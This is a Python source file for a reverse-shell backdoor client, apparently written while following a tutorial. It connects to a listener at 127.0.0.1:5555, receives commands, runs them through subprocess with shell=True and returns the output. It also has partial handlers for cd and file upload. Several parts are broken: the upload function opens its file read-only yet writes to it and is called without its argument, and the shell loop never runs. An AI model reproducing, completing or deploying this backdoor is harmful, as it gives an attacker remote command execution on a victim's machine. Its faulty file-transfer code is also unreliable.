import socket
from termcolor import *
import json
import subprocess
import os


def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())



def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue



def download_file(file_name):
    f = open(file_name, 'rb') 
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
            #f.write(chunk)
        except socket.timeout as e:
            break
        s.settimeout(None)
        f.close()









def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:7] == 'upload ':
            download_file()
            


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',5555)) 
# message = 'this is our first program to construct the backdoor'
# s.send(message.encode())
command = reliable_recv()
execute =subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
result = execute.stdout.read() + execute.stderr.read()
result = result.decode()
reliable_send(result)